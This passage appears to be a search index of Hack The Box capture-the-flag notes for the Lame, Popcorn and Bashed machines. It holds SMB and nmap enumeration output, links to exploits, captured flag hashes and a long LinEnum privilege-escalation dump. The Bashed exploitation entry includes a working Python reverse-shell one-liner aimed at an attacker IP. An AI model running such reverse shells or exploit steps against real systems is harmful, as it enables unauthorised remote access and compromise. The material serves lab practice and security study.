0x4be acb: 0x00000011 Account: ftp Name: (null) Desc: (null) index: 0x21 RID: 0x4c4 acb: 0x00000011 Account: tomcat55 Name: (null) Desc: (null) index: 0x22 RID: 0x3f0 acb: 0x00000011 Account: sync Name: sync Desc: (null) index: 0x23 RID: 0x3fc acb: 0x00000011 Account: uucp Name: uucp Desc: (null) ======================================= | Share Enumeration on 10.10.10.3 | ======================================= Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640. Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers tmp Disk oh noes! opt Disk IPC$ IPC IPC Service (lame server (Samba 3.0.20-Debian)) ADMIN$ IPC IPC Service (lame server (Samba 3.0.20-Debian)) Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP LAME smbmap -R -H 10.10.10.3 root@kali:~/HTB/lame# smbmap -R -H 10.10.10.3 [+] Finding open SMB ports.... [+] User SMB session establishd on 10.10.10.3... [+] IP: 10.10.10.3:445 Name: 10.10.10.3 Disk Permissions ---- ----------- print$ NO ACCESS tmp READ, WRITE .\\ dr--r--r-- 0 Thu Apr 18 03:12:06 2019 . dw--w--w-- 0 Sun May 20 14:36:11 2012 .. dr--r--r-- 0 Wed Apr 17 08:10:09 2019 .ICE-unix dr--r--r-- 0 Wed Apr 17 08:10:39 2019 .X11-unix -w--w--w-- 11 Wed Apr 17 08:10:39 2019 .X0-lock -w--w--w-- 0 Wed Apr 17 08:11:21 2019 5264.jsvc_up .\\\\.X11-unix\\ dr--r--r-- 0 Wed Apr 17 08:10:39 2019 . dr--r--r-- 0 Thu Apr 18 03:12:06 2019 .. -r--r--r-- 0 Wed Apr 17 08:10:39 2019 X0 opt NO ACCESS IPC$ NO ACCESS ADMIN$ NO ACCESS Use SMB exploit: https://github.com/amriunix/cve-2007-2447 ROOT: 92caac3be140ef409e45721348a4e9df","title":"Lame"},{"location":"ctf/hack-the-box/popcorn/","text":"Nmap 7.70 ( https://nmap.org ) at 2019-04-21 06:32 EDT Nmap scan report for 10.10.10.6 (10.10.10.6) Host is up (0.20s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA) |_ 2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA) 80/tcp open http Apache httpd 2.2.12 ((Ubuntu)) |_http-server-header: Apache/2.2.12 (Ubuntu) |_http-title: Site doesn't have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel gobuster -u http://10.10.10.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 2019/04/21 07:11:49 Starting gobuster ===================================================== /index (Status: 200) /test (Status: 200) /torrent (Status: 301) Use file upload (thumbnail) to upload a PHP shell / command executor. Privilege Escalation ls -lAR /home/george reveals an uncommon file (motd.legal-displayed) in the .cache https://www.exploit-db.com/exploits/14339/","title":"Popcorn"},{"location":"ctf/hack-the-box/popcorn/#privilege-escalation","text":"ls -lAR /home/george reveals an uncommon file (motd.legal-displayed) in the .cache https://www.exploit-db.com/exploits/14339/","title":"Privilege Escalation"},{"location":"ctf/hack-the-box/bashed[ippsec-pending]/01_Enumeration/Network/","text":"TCP roadcast-dhcp-discover: | Response 1 of 1: | IP Offered: 10.0.2.16 | Subnet Mask: 255.255.255.0 | Router: 10.0.2.2 | Domain Name Server: 10.0.2.3 |_ Server Identifier: 10.0.2.2 |_eap-info: please specify an interface with -e | targets-asn: |_ targets-asn.asn is a mandatory parameter Nmap scan report for 10.10.10.68 (10.10.10.68) Host is up (0.16s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-date: Wed, 24 Apr 2019 09:38:25 GMT; -1m28s from local time. |_http-fetch: Please enter the complete path of the directory to save data in. | http-grep: | (1) http://10.10.10.68:80/js/this.src;: | (1) ip: |_ + 10.10.10.68 | http-headers: | Date: Wed, 24 Apr 2019 09:38:28 GMT | Server: Apache/2.4.18 (Ubuntu) | Last-Modified: Mon, 04 Dec 2017 23:03:42 GMT | ETag: 1e3f-55f8bbac32f80 | Accept-Ranges: bytes | Content-Length: 7743 | Vary: Accept-Encoding | Connection: close | Content-Type: text/html | |_ (Request type: HEAD) | http-internal-ip-disclosure: |_ Internal IP Leaked: 127.0.1.1 |_http-mobileversion-checker: No mobile version detected. |_http-referer-checker: Couldn't find any cross-domain scripts. |_http-security-headers: |_http-server-header: Apache/2.4.18 (Ubuntu) | http-slowloris-check: | VULNERABLE: | Slowloris DOS attack | State: LIKELY VULNERABLE | IDs: CVE:CVE-2007-6750 | Slowloris tries to keep many connections to the target web server open and hold | them open as long as possible. It accomplishes this by opening connections to | the target web server and sending a partial request. By doing so, it starves | the http server's resources causing Denial Of Service. | | Disclosure date: 2009-09-17 | References: | http://ha.ckers.org/slowloris/ |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750 |_http-title: Arrexel's Development Site | http-useragent-tester: | Status for browser useragent: 200 | Allowed User Agents: | Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html) | libwww | lwp-trivial | libcurl-agent/1.0 | PHP/ | Python-urllib/2.5 | GT::WWW | Snoopy | MFC_Tear_Sample | HTTP::Lite | PHPCrawl | URI::Fetch | Zend_Http_Client | http client | PECL::HTTP | Wget/1.13.4 (linux-gnu) |_ WWW-Mechanize/1.34 |_http-xssed: No previously reported XSS vuln. Host script results: |_clock-skew: mean: -1m28s, deviation: 0s, median: -1m28s |_fcrdns: FAIL (No A record) |_ipidseq: All zeros |_path-mtu: PMTU == 1500 | qscan: | PORT FAMILY MEAN (us) STDDEV LOSS (%) | 1 0 203573.20 47138.34 0.0% |_80 0 199510.40 44353.09 0.0% Post-scan script results: | reverse-index: |_ 80/tcp: 10.10.10.68 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 379.90 seconds UDP","title":"Network"},{"location":"ctf/hack-the-box/bashed[ippsec-pending]/01_Enumeration/Network/#tcp","text":"roadcast-dhcp-discover: | Response 1 of 1: | IP Offered: 10.0.2.16 | Subnet Mask: 255.255.255.0 | Router: 10.0.2.2 | Domain Name Server: 10.0.2.3 |_ Server Identifier: 10.0.2.2 |_eap-info: please specify an interface with -e | targets-asn: |_ targets-asn.asn is a mandatory parameter Nmap scan report for 10.10.10.68 (10.10.10.68) Host is up (0.16s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-date: Wed, 24 Apr 2019 09:38:25 GMT; -1m28s from local time. |_http-fetch: Please enter the complete path of the directory to save data in. | http-grep: | (1) http://10.10.10.68:80/js/this.src;: | (1) ip: |_ + 10.10.10.68 | http-headers: | Date: Wed, 24 Apr 2019 09:38:28 GMT | Server: Apache/2.4.18 (Ubuntu) | Last-Modified: Mon, 04 Dec 2017 23:03:42 GMT | ETag: 1e3f-55f8bbac32f80 | Accept-Ranges: bytes | Content-Length: 7743 | Vary: Accept-Encoding | Connection: close | Content-Type: text/html | |_ (Request type: HEAD) | http-internal-ip-disclosure: |_ Internal IP Leaked: 127.0.1.1 |_http-mobileversion-checker: No mobile version detected. |_http-referer-checker: Couldn't find any cross-domain scripts. |_http-security-headers: |_http-server-header: Apache/2.4.18 (Ubuntu) | http-slowloris-check: | VULNERABLE: | Slowloris DOS attack | State: LIKELY VULNERABLE | IDs: CVE:CVE-2007-6750 | Slowloris tries to keep many connections to the target web server open and hold | them open as long as possible. It accomplishes this by opening connections to | the target web server and sending a partial request. By doing so, it starves | the http server's resources causing Denial Of Service. | | Disclosure date: 2009-09-17 | References: | http://ha.ckers.org/slowloris/ |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750 |_http-title: Arrexel's Development Site | http-useragent-tester: | Status for browser useragent: 200 | Allowed User Agents: | Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html) | libwww | lwp-trivial | libcurl-agent/1.0 | PHP/ | Python-urllib/2.5 | GT::WWW | Snoopy | MFC_Tear_Sample | HTTP::Lite | PHPCrawl | URI::Fetch | Zend_Http_Client | http client | PECL::HTTP | Wget/1.13.4 (linux-gnu) |_ WWW-Mechanize/1.34 |_http-xssed: No previously reported XSS vuln. Host script results: |_clock-skew: mean: -1m28s, deviation: 0s, median: -1m28s |_fcrdns: FAIL (No A record) |_ipidseq: All zeros |_path-mtu: PMTU == 1500 | qscan: | PORT FAMILY MEAN (us) STDDEV LOSS (%) | 1 0 203573.20 47138.34 0.0% |_80 0 199510.40 44353.09 0.0% Post-scan script results: | reverse-index: |_ 80/tcp: 10.10.10.68 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 379.90 seconds","title":"TCP"},{"location":"ctf/hack-the-box/bashed[ippsec-pending]/01_Enumeration/Network/#udp","text":"","title":"UDP"},{"location":"ctf/hack-the-box/bashed[ippsec-pending]/01_Enumeration/WebServices/","text":"Nikto DirBuster / GoBuster /dev SSL Cert WebDav CMS","title":"WebServices"},{"location":"ctf/hack-the-box/bashed[ippsec-pending]/01_Enumeration/WebServices/#nikto","text":"","title":"Nikto"},{"location":"ctf/hack-the-box/bashed[ippsec-pending]/01_Enumeration/WebServices/#dirbuster-gobuster","text":"/dev","title":"DirBuster / GoBuster"},{"location":"ctf/hack-the-box/bashed[ippsec-pending]/01_Enumeration/WebServices/#ssl-cert","text":"","title":"SSL Cert"},{"location":"ctf/hack-the-box/bashed[ippsec-pending]/01_Enumeration/WebServices/#webdav","text":"","title":"WebDav"},{"location":"ctf/hack-the-box/bashed[ippsec-pending]/01_Enumeration/WebServices/#cms","text":"","title":"CMS"},{"location":"ctf/hack-the-box/bashed[ippsec-pending]/02_Exploitation/phpbash/","text":"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(( 10.10.14.9 ,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([ /bin/sh , -i ]);'","title":"Phpbash"},{"location":"ctf/hack-the-box/bashed[ippsec-pending]/03_PostExploitation/Goodies/","text":"Hashes Password cat user.txt 2c281f318555dbc1b856957c7147bfc1 cat root.txt cc4f0afe3a1026d402ba10329674a8e2 Proof, Flags, Other","title":"Goodies"},{"location":"ctf/hack-the-box/bashed[ippsec-pending]/03_PostExploitation/Goodies/#hashes","text":"","title":"Hashes"},{"location":"ctf/hack-the-box/bashed[ippsec-pending]/03_PostExploitation/Goodies/#password","text":"cat user.txt 2c281f318555dbc1b856957c7147bfc1 cat root.txt cc4f0afe3a1026d402ba10329674a8e2","title":"Password"},{"location":"ctf/hack-the-box/bashed[ippsec-pending]/03_PostExploitation/Goodies/#proof-flags-other","text":"","title":"Proof, Flags, Other"},{"location":"ctf/hack-the-box/bashed[ippsec-pending]/03_PostExploitation/InfoBreakdown/05_UsersGroups/","text":"User www-data may run the following commands on bashed: (scriptmanager : scriptmanager) NOPASSWD: ALL","title":"05 UsersGroups"},{"location":"ctf/hack-the-box/bashed[ippsec-pending]/03_PostExploitation/ScriptResults/LinEnum/","text":"www-data@bashed:/tmp$ www-data@bashed:/tmp$ bash LinEnum.sh ######################################################### # Local Linux Enumeration Privilege Escalation Script # ######################################################### # www.rebootuser.com # version 0.96 [-] Debug Info [+] Thorough tests = Disabled Scan started at: Wed Apr 24 02:58:21 PDT 2019 ### SYSTEM ############################################## [-] Kernel information: Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux [-] Kernel information (continued): Linux version 4.4.0-62-generic (buildd@lcy01-30) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 [-] Specific release information: DISTRIB_ID=Ubuntu DISTRIB_RELEASE=16.04 DISTRIB_CODENAME=xenial DISTRIB_DESCRIPTION= Ubuntu 16.04.2 LTS NAME= Ubuntu VERSION= 16.04.2 LTS (Xenial Xerus) ID=ubuntu ID_LIKE=debian PRETTY_NAME= Ubuntu 16.04.2 LTS VERSION_ID= 16.04 HOME_URL= http://www.ubuntu.com/ SUPPORT_URL= http://help.ubuntu.com/ BUG_REPORT_URL= http://bugs.launchpad.net/ubuntu/ VERSION_CODENAME=xenial UBUNTU_CODENAME=xenial [-] Hostname: bashed ### USER/GROUP ########################################## [-] Current user/group info: uid=33(www-data) gid=33(www-data) groups=33(www-data) [-] Users that have previously logged onto the system: Username Port From Latest arrexel tty1 Sat Dec 23 20:20:46 -0800 2017 [-] Who else is logged on: 02:58:21 up 17:22, 0 users, load average: 0.16, 0.04, 0.01 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT [-] Group memberships: uid=0(root) gid=0(root) groups=0(root) uid=1(daemon) gid=1(daemon) groups=1(daemon) uid=2(bin) gid=2(bin) groups=2(bin) uid=3(sys) gid=3(sys) groups=3(sys) uid=4(sync) gid=65534(nogroup) groups=65534(nogroup) uid=5(games) gid=60(games) groups=60(games) uid=6(man) gid=12(man) groups=12(man) uid=7(lp) gid=7(lp) groups=7(lp) uid=8(mail) gid=8(mail) groups=8(mail) uid=9(news) gid=9(news) groups=9(news) uid=10(uucp) gid=10(uucp) groups=10(uucp) uid=13(proxy) gid=13(proxy) groups=13(proxy) uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=34(backup) gid=34(backup) groups=34(backup) uid=38(list) gid=38(list) groups=38(list) uid=39(irc) gid=39(irc) groups=39(irc) uid=41(gnats) gid=41(gnats) groups=41(gnats) uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup) uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync) uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network) uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve) uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy) uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm) uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup) uid=106(messagebus) gid=110(messagebus) groups=110(messagebus) uid=107(uuidd) gid=111(uuidd) groups=111(uuidd) uid=1000(arrexel) gid=1000(arrexel) groups=1000(arrexel),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare) uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager) [-] It looks like we have some admin users: uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm) uid=1000(arrexel) gid=1000(arrexel) groups=1000(arrexel),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare) [-] Contents of /etc/passwd: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false messagebus:x:106:110::/var/run/dbus:/bin/false uuidd:x:107:111::/run/uuidd:/bin/false arrexel:x:1000:1000:arrexel,,,:/home/arrexel:/bin/bash scriptmanager:x:1001:1001:,,,:/home/scriptmanager:/bin/bash [-] Super user account(s): root [+] We can sudo without supplying a password! Matching Defaults entries for www-data on bashed: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on bashed: (scriptmanager : scriptmanager) NOPASSWD: ALL [-] Accounts that have recently used sudo: /home/arrexel/.sudo_as_admin_successful [-] Are permissions on /home directories lax: total 16K drwxr-xr-x 4 root root 4.0K Dec 4 2017 . drwxr-xr-x 23 root root 4.0K Dec 4 2017 .. drwxr-xr-x 4 arrexel arrexel 4.0K Dec 4 2017 arrexel drwxr-xr-x 3 scriptmanager scriptmanager 4.0K Dec 4 2017 scriptmanager ### ENVIRONMENTAL ####################################### [-] Environment information: APACHE_PID_FILE=/var/run/apache2/apache2.pid APACHE_RUN_USER=www-data PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin APACHE_LOG_DIR=/var/log/apache2 PWD=/tmp LANG=C APACHE_RUN_GROUP=www-data SHLVL=2 APACHE_RUN_DIR=/var/run/apache2 APACHE_LOCK_DIR=/var/lock/apache2 _=/usr/bin/env [-] Path information: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin [-] Available shells: # /etc/shells: valid login shells /bin/sh /bin/dash /bin/bash /bin/rbash [-] Current umask value: 0022 u=rwx,g=rx,o=rx [-] umask value as specified in /etc/login.defs: UMASK 022 [-] Password and storage information: PASS_MAX_DAYS 99999 PASS_MIN_DAYS 0 PASS_WARN_AGE 7 ENCRYPT_METHOD SHA512 ### JOBS/TASKS ########################################## [-] Cron jobs: -rw-r--r-- 1 root root 722 Apr 5 2016 /etc/crontab /etc/cron.d: total 20 drwxr-xr-x 2 root root 4096 Dec 4 2017 . drwxr-xr-x 89 root root 4096 Dec 4 2017 .. -rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder -rw-r--r-- 1 root root 670 Mar 1 2016 php -rw-r--r-- 1 root root 191 Dec 4 2017 popularity-contest /etc/cron.daily: total 48 drwxr-xr-x 2 root root 4096 Dec 4 2017 . drwxr-xr-x 89 root root 4096 Dec 4 2017 .. -rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder -rwxr-xr-x 1 root root 539 Apr 5 2016 apache2 -rwxr-xr-x 1 root root 1474 Jan 17 2017 apt-compat -rwxr-xr-x 1 root root 355 May 22 2012 bsdmainutils -rwxr-xr-x 1 root root 1597 Nov 26 2015 dpkg -rwxr-xr-x 1 root root 372 May 5 2015 logrotate -rwxr-xr-x 1 root root 1293 Nov 6 2015 man-db -rwxr-xr-x 1 root root 435 Nov 17 2014 mlocate -rwxr-xr-x 1 root root 249 Nov 12 2015 passwd -rwxr-xr-x 1 root root 3449 Feb 26 2016 popularity-contest /etc/cron.hourly: total 12 drwxr-xr-x 2 root root 4096 Dec 4 2017 . drwxr-xr-x 89 root root 4096 Dec 4 2017 .. -rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder /etc/cron.monthly: total 12 drwxr-xr-x 2 root root 4096 Dec 4 2017 . drwxr-xr-x 89 root root 4096 Dec 4 2017 .. -rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder /etc/cron.weekly: total 20 drwxr-xr-x 2 root root 4096 Dec 4 2017 . drwxr-xr-x 89 root root 4096 Dec 4 2017 .. -rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder -rwxr-xr-x 1 root root 86 Apr 13 2016 fstrim -rwxr-xr-x 1 root root 771 Nov 6 2015 man-db [-] Crontab contents: # /etc/crontab: system-wide crontab # Unlike any other crontab you don't have to run the `crontab' # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user command 17 * * * * root cd / run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / run-parts --report /etc/cron.monthly ) # [-] Anything interesting in /var/spool/cron/crontabs: total 0 d????????? ? ? ? ? ? . d????????? ? ? ? ? ? .. -????????? ? ? ? ? ? root [-] Systemd timers: NEXT LEFT LAST PASSED UNIT ACTIVATES Wed 2019-04-24 05:19:07 PDT 2h 20min left Tue 2019-04-23 09:36:08 PDT 17h ago apt-daily.timer apt-daily.service Wed 2019-04-24 09:51:14 PDT 6h left Tue 2019-04-23 09:51:14 PDT 17h ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service 2 timers listed. Enable thorough tests to see inactive timers ### NETWORKING ########################################## [-] Network and IP info: ens33 Link encap:Ethernet HWaddr 00:50:56:b0:6e:47 inet addr:10.10.10.68 Bcast:10.10.10.255 Mask:255.255.255.255 inet6 addr: fe80::250:56ff:feb0:6e47/64 Scope:Link inet6 addr: dead:beef::250:56ff:feb0:6e47/64 Scope:Global UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:14032 errors:0 dropped:66 overruns:0 frame:0 TX packets:6645 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:1486490 (1.4 MB) TX bytes:5187223 (5.1 MB) lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:330937 errors:0 dropped:0 overruns:0 frame:0 TX packets:330937 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1 RX bytes:24490376 (24.4 MB) TX bytes:24490376 (24.4 MB) [-] ARP history: ? (10.10.10.2) at 00:50:56:b0:82:aa [ether] on ens33 [-] Default route: default 10.10.10.2 0.0.0.0 UG 0 0 0 ens33 [-] Listening TCP: Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 11247 10.10.10.68:54312 10.10.14.9:4444 ESTABLISHED 6411/python tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 10.10.10.68:80 10.10.14.9:58438 ESTABLISHED - [-] Listening UDP: Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name ### SERVICES ############################################# [-] Running processes: USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.5 37844 5820 ? Ss Apr23 0:03 /sbin/init noprompt root 2 0.0 0.0 0 0 ? S Apr23 0:00 [kthreadd] root 3 0.0 0.0 0 0 ? S Apr23 0:00 [ksoftirqd/0] root 5 0.0 0.0 0 0 ? S Apr23 0:00 [kworker/0:0H] root 7 0.0 0.0 0 0 ? S Apr23 0:00 [rcu_sched] root 8 0.0 0.0 0 0 ? S Apr23 0:00 [rcu_bh] root 9 0.0 0.0 0 0 ? S Apr23 0:00 [migration/0] root 10 0.0 0.0 0 0 ? S Apr23 0:00 [watchdog/0] root 11 0.0 0.0 0 0 ? S Apr23 0:00 [kdevtmpfs] root 12 0.0 0.0 0 0 ? S Apr23 0:00 [netns] root 13 0.0 0.0 0 0 ? S Apr23 0:00 [perf] root 14 0.0 0.0 0 0 ? S Apr23 0:00 [khungtaskd] root 15 0.0 0.0 0 0 ? S Apr23 0:00 [writeback] root 16 0.0 0.0 0 0 ? SN Apr23 0:00 [ksmd] root 17 0.0 0.0 0 0 ? SN Apr23 0:00 [khugepaged] root 18 0.0 0.0 0 0 ? S Apr23 0:00 [crypto] root 19 0.0 0.0 0 0 ? S Apr23 0:00 [kintegrityd] root 20 0.0 0.0 0 0 ? S Apr23 0:00 [bioset] root 21 0.0 0.0 0 0 ? S Apr23 0:00 [kblockd] root 22 0.0 0.0 0 0 ? S Apr23 0:00 [ata_sff] root 23 0.0 0.0 0 0 ? S Apr23 0:00 [md] root 24 0.0 0.0 0 0 ? S Apr23 0:00 [devfreq_wq] root 28 0.0 0.0 0 0 ? S Apr23 0:00 [kswapd0] root 29 0.0 0.0 0 0 ? S Apr23 0:00 [vmstat] root 30 0.0 0.0 0 0 ? S Apr23 0:00 [fsnotify_mark] root 31 0.0 0.0 0 0 ? S Apr23 0:00 [ecryptfs-kthrea] root 47 0.0 0.0 0 0 ? S Apr23 0:00 [kthrotld] root 48 0.0 0.0 0 0 ? S Apr23 0:00 [acpi_thermal_pm] root 49 0.0 0.0 0 0 ? S Apr23 0:00 [bioset] root 50 0.0 0.0 0 0 ? S Apr23 0:00 [bioset] root 51 0.0 0.0 0 0 ? S Apr23 0:00 [bioset] root 52 0.0 0.0 0 0 ? S Apr23 0:00 [bioset] root 53 0.0 0.0 0 0 ? S Apr23 0:00 [bioset] root 54 0.0 0.0 0 0 ? S Apr23 0:00 [bioset] root 55 0.0 0.0 0 0 ? S Apr23 0:00 [bioset] root 56 0.0 0.0 0 0 ? S Apr23 0:00 [bioset] root 57 0.0 0.0 0 0 ? S Apr23 0:00 [bioset] root 58 0.0 0.0 0 0 ? S Apr23 0:00 [bioset] root 59 0.0 0.0 0 0 ? S Apr23 0:00 [bioset] root 60 0.0 0.0 0 0 ? S Apr23 0:00 [bioset] root 61 0.0 0.0 0 0 ? S Apr23 0:00 [bioset] root 62 0.0 0.0 0 0 ? S Apr23 0:00 [bioset] root 63 0.0 0.0 0 0 ? S Apr23 0:00 [bioset] root 64 0.0 0.0 0 0 ? S Apr23 0:00 [bioset] root 65 0.0 0.0 0 0 ? S Apr23 0:00 [bioset] root 66 0.0 0.0 0 0 ? S Apr23 0:00 [bioset] root 67 0.0 0.0 0 0 ? S Apr23 0:00 [bioset] root 68 0.0 0.0 0 0 ? S Apr23 0:00 [bioset] root 69 0.0 0.0 0 0 ? S Apr23 0:00 [bioset] root 70 0.0 0.0 0 0 ? S Apr23 0:00 [bioset] root 71 0.0 0.0 0 0 ? S Apr23 0:00 [bioset] root 72 0.0 0.0 0 0 ? S Apr23 0:00 [bioset] root 73 0.0 0.0 0 0 ? S Apr23 0:00 [scsi_eh_0] root 74 0.0 0.0 0 0 ? S Apr23 0:00 [scsi_tmf_0] root 75 0.0 0.0 0 0 ? S Apr23 0:00 [scsi_eh_1] root 76 0.0 0.0 0 0 ? S Apr23 0:00 [scsi_tmf_1] root 84 0.0 0.0 0 0 ? S Apr23 0:00 [ipv6_addrconf] root 94 0.0 0.0 0 0 ? S Apr23 0:00 [bioset] root 98 0.0 0.0 0 0 ? S Apr23 0:00 [deferwq] root 99 0.0 0.0 0 0 ? S Apr23 0:00 [charger_manager] root 147 0.0 0.0 0 0 ? S Apr23 0:00 [scsi_eh_2] root 148 0.0 0.0 0 0 ? S Apr23 0:00 [scsi_tmf_2] root 150 0.0 0.0 0 0 ? S Apr23 0:00 [vmw_pvscsi_wq_2] root 151 0.0 0.0 0 0 ? S Apr23 0:00 [bioset] root 164 0.0 0.0 0 0 ? S Apr23 0:00 [kworker/0:1H] root 168 0.0 0.0 0 0 ? S Apr23 0:00 [kpsmoused] root 169 0.0 0.0 0 0 ? S Apr23 0:00 [ttm_swap] root 192 0.0 0.0 0 0 ? S Apr23 0:00 [jbd2/sda1-8] root 193 0.0 0.0 0 0 ? S Apr23 0:00 [ext4-rsv-conver] root 227 0.0 0.3 28332 3000 ? Ss Apr23 0:00 /lib/systemd/systemd-journald root 252 0.0 0.0 0 0 ? S Apr23 0:00 [kauditd] root 256 0.0 0.0 158624 280 ? Ssl Apr23 0:00 vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid root 287 0.0 0.3 44256 3828 ? Ss Apr23 0:00 /lib/systemd/systemd-udevd systemd+ 420 0.0 0.2 100324 2544 ? Ssl Apr23 0:04 /lib/systemd/systemd-timesyncd root 585 0.0 1.0 112120 10332 ? Ss Apr23 0:39 /usr/bin/vmtoolsd message+ 586 0.0 0.3 42900 3900 ? Ss Apr23 0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation root 589 0.0 0.1 20100 1204 ? Ss Apr23 0:00 /lib/systemd/systemd-logind syslog 590 0.0 0.3 256396 3392 ? Ssl Apr23 0:00 /usr/sbin/rsyslogd -n root 594 0.0 0.3 29008 3076 ? Ss Apr23 0:00 /usr/sbin/cron -f root 613 0.0 0.6 275864 6376 ? Ssl Apr23 0:01 /usr/lib/accountsservice/accounts-daemon root 653 0.0 0.1 15940 1804 tty1 Ss+ Apr23 0:00 /sbin/agetty --noclear tty1 linux root 749 0.0 2.4 255896 24812 ? Ss Apr23 0:02 /usr/sbin/apache2 -k start www-data 752 0.0 1.2 256308 12072 ? S Apr23 0:00 /usr/sbin/apache2 -k start www-data 753 0.0 1.1 256388 11788 ? S Apr23 0:00 /usr/sbin/apache2 -k start www-data 754 0.0 1.2 256372 12848 ? S Apr23 0:00 /usr/sbin/apache2 -k start www-data 755 0.0 1.2 256372 12316 ? S 